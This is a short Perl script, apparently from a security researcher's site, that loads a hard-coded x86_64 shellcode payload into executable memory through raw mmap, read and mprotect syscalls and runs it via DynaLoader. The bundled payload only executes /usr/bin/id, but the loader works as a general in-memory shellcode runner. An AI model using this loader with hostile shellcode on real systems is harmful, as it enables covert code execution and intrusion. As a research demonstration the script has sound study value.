#!/usr/bin/perl
#
# exec_asm64-open.pl: Execute assembly/shellcode on Linux x86_64
# written by isra - isra _replace_by_@_ fastmail.net - https://hckng.org
# version 0.1 - october 2023
#
use DynaLoader;
use strict;

# payload to execute /usr/bin/id with execve (x86_64)
my $p = "";
$p .= "\xe8\x0d\x00\x00\x00\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x69";
$p .= "\x64\x00\x5e\x5e\x48\x31\xc0\x48\x8d\x3e\x6a\x00\x57\x48\x89";
$p .= "\xe6\x48\x31\xc0\xb8\x3b\x00\x00\x00\xba\x00\x00\x00\x00\x0f";
$p .= "\x05\x5e\x48\x31\xd2\xb8\x3c\x00\x00\x00\x0f\x05";

print "\n";
print "*" x 44;
print "\n* exec_asm64-open.pl - by isra - hckng.org *\n";
print "*" x 44;
print "\n\n";

print "[+] Trying to write payload to a temporary file...";
my $f = "p";
open my $fh, '>', $f;
syswrite($fh, $p);
print "OK\n";

my $sz = (stat $f)[7];
print "[+] Payload size: $sz\n";
print "[+] Trying to map new memory area...";
# mmap
my $ptr = syscall(9, 0, $sz, 3, 33, -1, 0);
if($ptr == -1) {
    die "failed to map memory\n";
}
print "OK\n";
printf("[+] Start of mapped area: 0x%x\n", $ptr);

printf("[+] Trying to write payload at 0x%x...", $ptr);
# open
my $fd = syscall(2, $f, 0);
# read
my $bytes = syscall(0, $fd, $ptr, $sz);
if($bytes == -1) {
	die "failed to read payload file\n"
}
print "OK\n";

print "[+] Trying to update memory protection...";
# mprotect
my $ret = syscall(10, $ptr, $sz, 5);
if($ret == -1) {
    die "failed to update memory protection\n";
}
print "OK\n";

print "[+] Trying to install xsub...";
my $x = DynaLoader::dl_install_xsub("", $ptr);
print "OK\n";

print "[+] Going to execute:\n\n";
&{$x};

